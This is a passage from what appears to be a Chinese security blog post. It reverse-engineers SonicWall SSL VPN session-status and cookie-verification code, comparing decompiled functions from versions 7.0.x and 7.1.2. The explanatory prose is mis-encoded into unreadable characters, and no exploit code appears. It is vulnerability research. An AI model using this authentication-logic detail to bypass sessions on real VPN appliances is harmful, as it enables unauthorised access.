class="line">  _BYTE v7[<span class="number">16</span>]; <span class="comment">// [rsp+1070h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">72</span>]; <span class="comment">// [rsp+1080h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+10C8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( (dword_A039974 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (dword_A039974 &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_28CD819(<span class="number">1428</span>, <span class="number">104LL</span>, <span class="string">&quot;SSLVPNSERVER log from %s:%d, IP: 0x%x&quot;</span>, <span class="string">&quot;sslpvnHandleSessionStatus&quot;</span>, <span class="number">3334LL</span>, <span class="number">0LL</span>, <span class="number">-1LL</span>);</span><br><span class="line">      sub_28CD819(<span class="number">1428</span>, <span class="number">104LL</span>, <span class="string">&quot;====Enter====&quot;</span>, <span class="number">0xFFFFFFFF</span>LL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( byte_8D10800 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( __readfsbyte(<span class="number">0xFFFEC2A1</span>) != <span class="number">1</span> )</span><br><span class="line">          sub_2D550EB(&amp;mutex_);</span><br><span class="line">        sub_27C9E92(&amp;unk_C5C5800, <span class="string">&quot;sslpvnHandleSessionStatus&quot;</span>, <span class="number">3334LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;SSLVPNSERVER: (%s %d) &quot;</span>, <span class="string">&quot;sslpvnHandleSessionStatus&quot;</span>, <span class="number">3334</span>);</span><br><span class="line">      sub_1F97A1A(<span class="string">&quot;====Enter====&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( byte_8D10800 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_27CA075(&amp;unk_C5C5800, <span class="string">&quot;sslpvnHandleSessionStatus&quot;</span>, <span class="number">3334LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( __readfsbyte(<span class="number">0xFFFEC2A1</span>) != <span class="number">1</span> )</span><br><span class="line">          sub_2D55155(&amp;mutex_);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  src = getSwapCookieFromHttpreq(haystack);</span><br><span class="line">  <span class="keyword">if</span> ( src )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncpy</span>(dest, src, <span class="number">0x3F</span>uLL);</span><br><span class="line">    maybe_url_decode(dest);</span><br><span class="line">    v6 = sslvpnVerifyTunnelSession(a1, dest, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      dual_fdprintf(a1, <span class="string">&quot;HTTP/1.0 200 OK\r\n&quot;</span>);</span><br><span class="line">      dual_fdprintf(a1, <span class="string">&quot;Server: SonicWALL SSLVPN Web Server\r\n\r\n&quot;</span>);</span><br><span class="line">      dual_fdprintf(a1, <span class="string">&quot;&#123;\&quot;status\&quot;:\&quot;found\&quot;&#125;\r\n\r\n&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( sub_2ED30E9(a2, <span class="string">&quot;forReconnect&quot;</span>, v7, <span class="number">1LL</span>) &amp;&amp; v7[<span class="number">0</span>] == <span class="number">49</span> )</span><br><span class="line">        *(v6 + <span class="number">792</span>) |= <span class="number">2u</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      dual_fdprintf(a1, <span class="string">&quot;HTTP/1.0 200 OK\r\n&quot;</span>);</span><br><span class="line">      dual_fdprintf(a1, <span class="string">&quot;Server: SonicWALL SSLVPN Web Server\r\n\r\n&quot;</span>);</span><br><span class="line">      dual_fdprintf(a1, <span class="string">&quot;&#123;\&quot;status\&quot;:\&quot;notfound\&quot;&#125;\r\n\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (dword_A039974 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (dword_A039974 &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_28CD819(</span><br><span class="line">          <span class="number">1428</span>,</span><br><span class="line">          <span class="number">104LL</span>,</span><br><span class="line">          <span class="string">&quot;SSLVPNSERVER log from %s:%d, IP: 0x%x&quot;</span>,</span><br><span class="line">          <span class="string">&quot;sslpvnHandleSessionStatus&quot;</span>,</span><br><span class="line">          <span class="number">3358LL</span>,</span><br><span class="line">          <span class="number">0LL</span>,</span><br><span class="line">          <span class="number">-1LL</span>);</span><br><span class="line">        sub_28CD819(<span class="number">1428</span>, <span class="number">104LL</span>, <span class="string">&quot;====Exit====&quot;</span>, <span class="number">0xFFFFFFFF</span>LL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( byte_8D10800 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( __readfsbyte(<span class="number">0xFFFEC2A1</span>) != <span class="number">1</span> )</span><br><span class="line">            sub_2D550EB(&amp;mutex_);</span><br><span class="line">          sub_27C9E92(&amp;unk_C5C5800, <span class="string">&quot;sslpvnHandleSessionStatus&quot;</span>, <span class="number">3358LL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;SSLVPNSERVER: (%s %d) &quot;</span>, <span class="string">&quot;sslpvnHandleSessionStatus&quot;</span>, <span class="number">3358</span>);</span><br><span class="line">        sub_1F97A1A(<span class="string">&quot;====Exit====&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( byte_8D10800 )</span><br><span class="line">        &#123;</span><br><span class="line">          sub_27CA075(&amp;unk_C5C5800, <span class="string">&quot;sslpvnHandleSessionStatus&quot;</span>, <span class="number">3358LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( __readfsbyte(<span class="number">0xFFFEC2A1</span>) != <span class="number">1</span> )</span><br><span class="line">            sub_2D55155(&amp;mutex_);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (dword_A039974 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (dword_A039974 &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_28CD819(<span class="number">1428</span>, <span class="number">104LL</span>, <span class="string">&quot;SSLVPNSERVER log from %s:%d, IP: 0x%x&quot;</span>, <span class="string">&quot;sslpvnHandleSessionStatus&quot;</span>, <span class="number">3337LL</span>, <span class="number">0LL</span>, <span class="number">-1LL</span>);</span><br><span class="line">      sub_28CD819(<span class="number">1428</span>, <span class="number">104LL</span>, <span class="string">&quot;====Exit====&quot;</span>, <span class="number">0xFFFFFFFF</span>LL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( byte_8D10800 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( __readfsbyte(<span class="number">0xFFFEC2A1</span>) != <span class="number">1</span> )</span><br><span class="line">          sub_2D550EB(&amp;mutex_);</span><br><span class="line">        sub_27C9E92(&amp;unk_C5C5800, <span class="string">&quot;sslpvnHandleSessionStatus&quot;</span>, <span class="number">3337LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;SSLVPNSERVER: (%s %d) &quot;</span>, <span class="string">&quot;sslpvnHandleSessionStatus&quot;</span>, <span class="number">3337</span>);</span><br><span class="line">      sub_1F97A1A(<span class="string">&quot;====Exit====&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( byte_8D10800 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_27CA075(&amp;unk_C5C5800, <span class="string">&quot;sslpvnHandleSessionStatus&quot;</span>, <span class="number">3337LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( __readfsbyte(<span class="number">0xFFFEC2A1</span>) != <span class="number">1</span> )</span><br><span class="line">          sub_2D55155(&amp;mutex_);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä»åç§°æ¥çœ‹è¿™ä¸ªåŠŸèƒ½åº”è¯¥æ˜¯ç”¨äºè·å– session å¯¹åº”ä¼šè¯çŠ¶æ€çš„ï¼Œé™¤å»å‡½æ•°ä¸­å¤§é‡çš„ LOG ä¿¡æ¯ï¼Œå®é™…ä¸Šå®ƒæ‰€æ‰§è¡Œçš„æ“ä½œéå¸¸ç®€å•ï¼Œé¦–å…ˆä½¿ç”¨ <code>getSwapCookieFromHttpreq</code> å‡½æ•°å°è¯•ä»è¯·æ±‚ä¸­è·å– Cookie æ•°æ®</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *__fastcall <span class="title function_">getSwapCookieFromHttpreq</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *haystack)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// [rsp+1030h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *i_1; <span class="comment">// [rsp+1038h] [rbp-18h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// [rsp+1038h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !haystack )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  i_1 = <span class="built_in">strstr</span>(haystack, <span class="string">&quot;swap=&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !i_1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = i_1; *i &amp;&amp; *i != <span class="string">&#x27;;&#x27;</span> &amp;&amp; *i != <span class="number">13</span> &amp;&amp; *i != <span class="number">10</span>; ++i )</span><br><span class="line">    ;</span><br><span class="line">  *i = <span class="number">0</span>;</span><br><span class="line">  v5 = i_1 + <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (dword_A039974 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (dword_A039974 &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_28CD819(<span class="number">1428</span>, <span class="number">104</span>, <span class="string">&quot;SSLVPNSERVER log from %s:%d, IP: 0x%x&quot;</span>, <span class="string">&quot;getSwapCookieFromHttpreq&quot;</span>, <span class="number">1498</span>, <span class="number">0</span>);</span><br><span class="line">      sub_28CD819(<span class="number">1428</span>, <span class="number">104</span>, <span class="string">&quot;sslvpnclient cookie:%s&quot;</span>, v5, <span class="number">-1</span>, v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( byte_8D10800 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( __readfsbyte(<span class="number">0xFFFEC2A1</span>) != <span class="number">1</span> )</span><br><span class="line">          sub_2D550EB(&amp;mutex_);</span><br><span class="line">        sub_27C9E92(&amp;unk_C5C5800, <span class="string">&quot;getSwapCookieFromHttpreq&quot;</span>, <span class="number">1498LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;SSLVPNSERVER: (%s %d) &quot;</span>, <span class="string">&quot;getSwapCookieFromHttpreq&quot;</span>, <span class="number">1498</span>);</span><br><span class="line">      sub_1F97A1A(<span class="string">&quot;sslvpnclient cookie:%s&quot;</span>, v5);</span><br><span class="line">      <span class="keyword">if</span> ( byte_8D10800 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_27CA075(&amp;unk_C5C5800, <span class="string">&quot;getSwapCookieFromHttpreq&quot;</span>, <span class="number">1498LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( __readfsbyte(<span class="number">0xFFFEC2A1</span>) != <span class="number">1</span> )</span><br><span class="line">          sub_2D55155(&amp;mutex_);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥æ¨æ–­ Cookie ä¸­åº”è¯¥åŒ…å«ä¸€ä¸ª swap å‚æ•°ï¼Œä¸º session å€¼ã€‚è·å–åˆ° session å€¼ä»¥åä½¿ç”¨ <code>maybe_url_decode</code> è¿›è¡Œ URL è§£ç ï¼Œéšåè°ƒç”¨ <code>sslvpnVerifyTunnelSession</code> è¿›è¡Œ session é‰´æƒã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sslvpnVerifyTunnelSession</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *session, <span class="type">char</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 i; <span class="comment">// [rsp+1030h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( session )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_2F1F013(session_list);</span><br><span class="line">    <span class="keyword">for</span> ( i = sub_2F1EECB(session_list); i; i = sub_2F1EF2C(i) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (*(i + <span class="number">792</span>) &amp; <span class="number">8</span>) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a3 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(session, (i + <span class="number">465</span>), *(i + <span class="number">532</span>)) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(session, (i + <span class="number">432</span>), <span class="number">0x20</span>uLL) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !i &amp;&amp; (dword_A039974 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (dword_A039974 &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_28CD819(</span><br><span class="line">          <span class="number">1428</span>,</span><br><span class="line">          <span class="number">104LL</span>,</span><br><span class="line">          <span class="string">&quot;SSLVPNSERVER log from %s:%d, IP: 0x%x&quot;</span>,</span><br><span class="line">          <span class="string">&quot;sslvpnVerifyTunnelSession&quot;</span>,</span><br><span class="line">          <span class="number">1477LL</span>,</span><br><span class="line">          <span class="number">0LL</span>,</span><br><span class="line">          <span class="number">-1LL</span>);</span><br><span class="line">        sub_28CD819(<span class="number">1428</span>, <span class="number">104LL</span>, <span class="string">&quot;%s verify sslvpn session failed!&quot;</span>, <span class="string">&quot;sslvpnVerifyTunnelSession&quot;</span>, <span class="number">0xFFFFFFFF</span>LL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( byte_8D10800 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( __readfsbyte(<span class="number">0xFFFEC2A1</span>) != <span class="number">1</span> )</span><br><span class="line">            sub_2D550EB(&amp;mutex_);</span><br><span class="line">          sub_27C9E92(&amp;unk_C5C5800, <span class="string">&quot;sslvpnVerifyTunnelSession&quot;</span>, <span class="number">1477LL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;SSLVPNSERVER: (%s %d) &quot;</span>, <span class="string">&quot;sslvpnVerifyTunnelSession&quot;</span>, <span class="number">1477</span>);</span><br><span class="line">        sub_1F97A1A(<span class="string">&quot;%s verify sslvpn session failed!&quot;</span>, <span class="string">&quot;sslvpnVerifyTunnelSession&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( byte_8D10800 )</span><br><span class="line">        &#123;</span><br><span class="line">          sub_27CA075(&amp;unk_C5C5800, <span class="string">&quot;sslvpnVerifyTunnelSession&quot;</span>, <span class="number">1477LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( __readfsbyte(<span class="number">0xFFFEC2A1</span>) != <span class="number">1</span> )</span><br><span class="line">            sub_2D55155(&amp;mutex_);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_2F1F175(session_list);</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (dword_A039974 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (dword_A039974 &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_28CD819(</span><br><span class="line">          <span class="number">1428</span>,</span><br><span class="line">          <span class="number">104LL</span>,</span><br><span class="line">          <span class="string">&quot;SSLVPNSERVER log from %s:%d, IP: 0x%x&quot;</span>,</span><br><span class="line">          <span class="string">&quot;sslvpnVerifyTunnelSession&quot;</span>,</span><br><span class="line">          <span class="number">1444LL</span>,</span><br><span class="line">          <span class="number">0LL</span>,</span><br><span class="line">          <span class="number">-1LL</span>);</span><br><span class="line">        sub_28CD819(<span class="number">1428</span>, <span class="number">104LL</span>, <span class="string">&quot;NULL cookie!&quot;</span>, <span class="number">0xFFFFFFFF</span>LL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( byte_8D10800 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( __readfsbyte(<span class="number">0xFFFEC2A1</span>) != <span class="number">1</span> )</span><br><span class="line">            sub_2D550EB(&amp;mutex_);</span><br><span class="line">          sub_27C9E92(&amp;unk_C5C5800, <span class="string">&quot;sslvpnVerifyTunnelSession&quot;</span>, <span class="number">1444LL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;SSLVPNSERVER: (%s %d) &quot;</span>, <span class="string">&quot;sslvpnVerifyTunnelSession&quot;</span>, <span class="number">1444</span>);</span><br><span class="line">        sub_1F97A1A(<span class="string">&quot;NULL cookie!&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( byte_8D10800 )</span><br><span class="line">        &#123;</span><br><span class="line">          sub_27CA075(&amp;unk_C5C5800, <span class="string">&quot;sslvpnVerifyTunnelSession&quot;</span>, <span class="number">1444LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( __readfsbyte(<span class="number">0xFFFEC2A1</span>) != <span class="number">1</span> )</span><br><span class="line">            sub_2D55155(&amp;mutex_);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªå‡½æ•°çš„å®ç°ä¹Ÿç›¸å¯¹ç®€å•ï¼Œå®ƒä¼šéå†ä¿å­˜åœ¨å†…å­˜ä¸­çš„ <code>session_list</code>ï¼Œå°è¯•å’Œç”¨æˆ·æäº¤çš„ session è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæ¯”è¾ƒæˆåŠŸè¯´æ˜æ‰¾åˆ°äº†å¯¹åº”ä¼šè¯ï¼Œè¡¨ç¤ºé‰´æƒæˆåŠŸï¼Œåä¹‹å¤±è´¥ã€‚</p>
<p>7.0.x å®ç°çš„æ˜¯ä¸€ä¸ªç›¸å¯¹å¸¸è§„çš„éªŒè¯é€»è¾‘ï¼Œæˆ‘ä»¬å†æ¥çœ‹çœ‹ 7.1.x ç‰ˆæœ¬æ­¤å¤„é€»è¾‘æ˜¯å¦æœ‰ä¿®æ”¹ã€‚</p>
<p>åˆ†æ 7.1.2-7019 ç‰ˆæœ¬ç¨‹åºï¼ŒsessionStatus å¤„ç†å‡½æ•°ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sessionStatus</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> n2147483646, _DWORD *a2, <span class="type">double</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 param; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *str; <span class="comment">// rax</span></span><br><span class="line">  __int64 SslvpnSessionFromCookie; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  param = get_param(a2, <span class="string">&quot;cookie&quot;</span>);</span><br><span class="line">  str = get_str(param);</span><br><span class="line">  SslvpnSessionFromCookie = getSslvpnSessionFromCookie(str);</span><br><span class="line">  v6 = check_session(SslvpnSessionFromCookie);</span><br><span class="line">  <span class="keyword">if</span> ( SslvpnSessionFromCookie &amp;&amp; v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(SslvpnSessionFromCookie + <span class="number">456</span>) = sub_2011070();</span><br><span class="line">    sub_26619D0(n2147483646, <span class="string">&quot;HTTP/1.0 200 OK\r\n&quot;</span>, a3);</span><br><span class="line">    sub_26619D0(n2147483646, <span class="string">&quot;Server: SonicWALL SSLVPN Web Server\r\n\r\n&quot;</span>);</span><br><span class="line">    sub_26619D0(n2147483646, <span class="string">&quot;&#123;\&quot;status\&quot;:\&quot;active\&quot;&#125;\r\n\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_26619D0(n2147483646, <span class="string">&quot;HTTP/1.0 200 OK\r\n&quot;</span>, a3);</span><br><span class="line">    sub_26619D0(n2147483646, <span class="string">&quot;Server: SonicWALL SSLVPN Web Server\r\n\r\n&quot;</span>);</span><br><span class="line">    sub_26619D0(n2147483646, <span class="string">&quot;&#123;\&quot;status\&quot;:\&quot;notfound\&quot;&#125;\r\n\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ–°ç‰ˆæœ¬é€»è¾‘å­˜åœ¨ä¸€äº›å˜åŠ¨ï¼Œä¾‹å¦‚ <code>get_param</code> è·å–å‚æ•°çš„æ–¹å¼ã€ç§»é™¤äº†å¾ˆå¤š LOG ä¿¡æ¯ç­‰ã€‚ä½†æœ€å…³é”®çš„æ˜¯ session éªŒè¯é€»è¾‘å‘ç”Ÿäº†å˜åŒ–ã€‚</p>
<p><code>getSslvpnSessionFromCookie</code> å‡½æ•°å†…å®¹å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">getSslvpnSessionFromCookie</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *raw_str)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> raw_str_len; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *s_1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *s_2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 cookie; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !raw_str )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  raw_str_len = <span class="built_in">strlen</span>(raw_str);</span><br><span class="line">  <span class="keyword">if</span> ( raw_str_len == <span class="number">32</span> )                      <span class="comment">// not base64 encoded</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !verifyCookieCheckSum(raw_str, <span class="number">32</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">return</span> find_cookie(raw_str, <span class="number">1u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( raw_str_len != <span class="number">44</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    s_1 = base64_decode(raw_str);               <span class="comment">// base64 encoded</span></span><br><span class="line">    s_2 = s_1;</span><br><span class="line">    <span class="keyword">if</span> ( !s_1 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !verifyCookieCheckSum(s_1, <span class="number">32</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      maybe_free(s_2);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cookie = find_cookie(s_2, <span class="number">1u</span>);</span><br><span class="line">    maybe_free(s_2);</span><br><span class="line">    <span class="keyword">return</span> cookie;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç°åœ¨ session æœ‰ä¸¤ç§è§£ææ–¹å¼ï¼Œå½“é•¿åº¦ä¸º 32 æ—¶è¯´æ˜æ˜¯æœªç¼–ç çš„æ•°æ®ï¼Œå½“é•¿åº¦ä¸º 44 æ—¶è¯´æ˜æ˜¯ BASE64 ç¼–ç çš„æ•°æ®ã€‚æ•°æ®è§£ç ä¹‹åéƒ½ä¼šè°ƒç”¨ <code>verifyCookieCheckSum</code> å…ˆæ¥æ£€æŸ¥æ•°æ®æ ¼å¼</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">verifyCookieCheckSum</span><span class="params">(_BYTE *raw_str, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *s_1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// r12d</span></span><br><span class="line">  _BYTE *s; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">26</span>]; <span class="comment">// [rsp+Eh] [rbp-1Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s_1 = raw_str;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    s_1 = &amp;raw_str[size - <span class="number">2</span> + <span class="number">1</span>];</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v3 ^= *raw_str++;</span><br><span class="line">    <span class="keyword">while</span> ( raw_str != s_1 );</span><br><span class="line">    buf[<span class="number">0</span>] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  s = base64_encode(buf);</span><br><span class="line">  <span class="keyword">if</span> ( s )</span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(v4) = *s == *s_1;</span><br><span class="line">    maybe_free(s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

